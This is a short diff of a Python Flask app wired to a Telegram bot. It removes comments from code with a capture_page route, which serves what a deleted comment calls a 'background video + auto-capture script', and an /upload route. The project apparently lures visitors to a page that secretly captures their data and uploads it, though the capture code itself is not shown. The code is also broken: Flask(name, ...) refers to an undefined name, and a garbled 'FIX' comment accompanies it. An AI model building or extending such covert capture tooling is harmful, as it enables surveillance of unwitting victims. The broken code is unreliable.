@@ -7,7 +7,6 @@ from utils import decode_uid
 import telebot
 from werkzeug.utils import secure_filename
 
-# Load environment variables from .env
 load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
@@ -18,7 +17,6 @@ if not BOT_TOKEN:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# FIX: name instead of name
 app = Flask(name, static_folder="static", template_folder="templates")
 app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE_MB * 1024 * 1024
 
@@ -37,7 +35,6 @@ def capture_page():
         user_id = decode_uid(uid_enc)
     except Exception:
         return abort(400, "invalid uid")
-    # Serve your background video + auto-capture script
     return render_template("index.html", uid=uid_enc)
 
 @app.route("/upload", methods=["POST"])
